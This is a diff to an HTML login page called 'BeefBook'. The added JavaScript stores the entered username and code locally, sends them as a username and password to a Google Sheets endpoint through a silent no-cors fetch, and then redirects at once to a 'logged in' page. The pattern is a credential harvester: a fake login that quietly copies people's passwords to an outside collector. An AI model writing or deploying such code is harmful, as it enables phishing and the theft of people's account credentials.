@@ -1,7 +1,7 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
+  <meta charset="utf-8">
   <title>BeefBook</title>
 </head>
 <body style="background-color: Violet;">
@@ -26,8 +26,20 @@
       const uname = document.getElementById('uname').value.trim();
       const code = document.getElementById('code').value.trim();
 
-      // Store username and code in localStorage
+      // 1️⃣ Save locally first
       localStorage.setItem('username', uname);
       localStorage.setItem('code', code);
 
-      // Send to Google Sheets (fire-and-forget
+      // 2️⃣ Send to Google Sheets (fire-and-forget)
+      fetch(URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify({ username: uname, password: code })
+      });
+
+      // 3️⃣ Redirect immediately
+      window.location.href = './BBlogedin.html';
+    });
+  </script>
+</body>
+</html>
